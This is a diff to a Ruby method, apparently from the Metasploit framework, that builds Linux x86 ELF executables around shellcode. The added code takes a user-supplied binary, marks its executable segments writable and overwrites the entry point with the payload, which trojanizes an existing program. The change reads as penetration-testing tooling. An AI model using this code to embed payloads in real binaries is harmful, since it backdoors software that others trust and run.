@@ -560,15 +560,21 @@ require 'digest/sha1'
 		return mo
 	end
 
+	#
+	# Create a 32-bit Linux ELF containing the payload provided in +code+
+	#
+	# For the default template, this method just appends the payload.  For
+	# user-provided templates, modifies the header to mark all executable
+	# segments as writable and overwrites the entrypoint (usually _start) with
+	# the payload.
+	#
 	def self.to_linux_x86_elf(framework, code, opts={})
+		unless opts[:template]
+			default = true
+		end
 
 		# Allow the user to specify their own template
 		set_template_default(opts, "template_x86_linux.bin")
-
-		elf = ''
-		File.open(opts[:template], "rb") { |fd|
-			elf = fd.read(fd.stat.size)
-		}
 
 		# The old way to do it is like other formats, just overwrite a big
 		# block of rwx mem with our shellcode.
@@ -576,12 +582,48 @@ require 'digest/sha1'
 		#co = elf.index( " " * 512 )
 		#elf[bo, 2048] = [code].pack('a2048') if bo
 
-		# The new template is just an ELF header with its entry point set to
-		# the end of the file, so just append shellcode to it and fixup
-		# p_filesz and p_memsz in the header for a working ELF executable.
-		elf << code
-		elf[0x44,4] = [elf.length + code.length].pack('V')
-		elf[0x48,4] = [elf.length + code.length].pack('V')
+		if default
+			# The new template is just an ELF header with its entry point set to
+			# the end of the file, so just append shellcode to it and fixup
+			# p_filesz and p_memsz in the header for a working ELF executable.
+			elf = ''
+			File.open(opts[:template], "rb") { |fd|
+				elf = fd.read(fd.stat.size)
+			}
+
+			elf << code
+			elf[0x44,4] = [elf.length + code.length].pack('V')
+			elf[0x48,4] = [elf.length + code.length].pack('V')
+		else
+			# If this isn't our normal template, we have to do some fancy
+			# header patching to mark the .text section rwx before putting our
+			# payload into the entry point.
+
+			# read in the template and parse it
+			e = Metasm::ELF.decode_file(opts[:template])
+
+			# This will become a modified copy of the template's original phdr
+			new_phdr = Metasm::EncodedData.new
+			e.segments.each { |s|
+				# Be lazy and mark any executable segment as writable.  Doing
+				# it this way means we don't have to care about which one
+				# contains .text
+				if s.flags.include? "X"
+					s.flags += [ "W" ]
+				end
+				new_phdr << s.encode(e)
+			}
+
+			# Copy the original file
+			elf = File.read(opts[:template])
+
+			# Replace the header with our rwx modified version
+			elf[e.header.phoff, new_phdr.data.length] = new_phdr.data
+
+			# Replace code at the entrypoint with our payload
+			entry_off = e.addr_to_off(e.label_addr('entrypoint'))
+			elf[entry_off, code.length] = code
+		end
 
 		return elf
 	end
